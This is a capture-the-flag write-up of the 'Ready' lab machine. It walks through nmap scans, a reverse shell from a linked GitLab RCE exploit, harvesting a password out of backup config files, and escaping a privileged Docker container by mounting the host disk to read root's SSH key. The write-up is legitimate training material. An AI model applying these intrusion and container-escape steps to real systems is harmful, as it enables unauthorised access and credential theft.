# Ready

## Summary

Ready is a medium rated box. After initial enumeration a Gitlab instance is found on port 80. The version of Gitlab that is running is found to be vulnerable to an RCE exploit. After getting a shell on the box we notice that we are inside a docker container. Eventually we find the docker has mounted the host's file system. This allows us to read files off of the host system. We then find root's id_rsa which allows us to SSH into the machine as root.

## Enumeration

Using Nmap we find that there are 2 open ports. The first is 22 which hosts SSH and the other is 5080 which hosts a Gitlab instance.

### All ports
```bash
sudo nmap -p- 10.10.10.220 -oA nmap/all-ports
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 18:51 EDT
Nmap scan report for 10.10.10.220
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 1288.04 seconds
```

### More info
```bash
sudo nmap -p22,5080 -sC -sV -oA nmap/info 10.10.10.220
[sudo] password for tc:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 19:14 EDT
Nmap scan report for 10.10.10.220
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
```

## Port 5080

Navigating to the Gitlab instance we can register a new user. After registering a user we can poke around in the system. Eventually we come across a version number. The gitlab instace is vulnerable to [this](https://www.exploit-db.com/exploits/49257) attack. In order to get the attack to work all we need is our cookie and authenticity tocken. After changing those 2 things and the IP and port for the reverse shell we end up with a shell as the Git user.

## Docker Container

As the git user we find that we are in a docker container.

```bash
[+] Is ASLR enabled? ............... Yes  
[+] Printer? ....................... lpstat Not Found  
[+] Is this a virtual machine? ..... Yes (docker)  
[+] Is this a container? ........... Looks like we're in a Docker container  
[+] Any running containers? ........ No
```

At this point I started looking around for interesting files on the system. I did this with ```find```.

```bash
find / 2>/dev/null | grep -v "bin\|lib\|proc\|sys\|var\|run\|etc\|dev\|usr\|icu\|terminfo\|locale\|postgresql\|cookbooks\|embedded\|LICENSES"
...[snip]...
/opt/backup/gitlab.rb
/opt/backup/docker-compose.yml
/opt/backup/gitlab-secrets.json
```

In the gitlab-secrets.json we find a password.

```bash
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

Using this password we can become root in the Docker container. 

## Escaping Docker

As root in the container we notice that the privileged flag is set as true. We can see this in the ```docker-compose.yaml``` file.

```YAML
cat /opt/backup/docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

Following along with the [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#privileged-flag) article we can escape the docker container. We find that we can use the fdisk command in the docker container. Using this command we notice that a linux filesystem on /dev/sda2.

```bash
fdisk -l
...[snip]...
Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
```

Mounting this device into the docker container gives us access to the filesystem of the remote machine. 

```bash
root@gitlab:/mnt# mount /dev/sda2 /mnt/test/
root@gitlab:/mnt# cd test/
root@gitlab:/mnt/test# ls -la
total 100
drwxr-xr-x  20 root root  4096 Dec  7 17:44 .
drwxr-xr-x   1 root root  4096 Apr  7 20:56 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  3  2020 boot
drwxr-xr-x   2 root root  4096 May  7  2020 cdrom
drwxr-xr-x   5 root root  4096 Dec  4 15:20 dev
drwxr-xr-x 101 root root  4096 Feb 11 14:31 etc
drwxr-xr-x   3 root root  4096 Jul  7  2020 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 May  7  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   3 root root  4096 Jun 15  2020 opt
drwxr-xr-x   2 root root  4096 Apr 15  2020 proc
drwx------  10 root root  4096 Dec  7 17:02 root
drwxr-xr-x  10 root root  4096 Apr 23  2020 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 May  7  2020 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
drwxr-xr-x   2 root root  4096 Apr 15  2020 sys
drwxrwxrwt  12 root root 12288 Apr  7 20:57 tmp
drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
drwxr-xr-x  14 root root  4096 Dec  4 15:20 var
```

At this point we can read any file on the host machine as root. This means we can read root.txt or root's id_rsa. 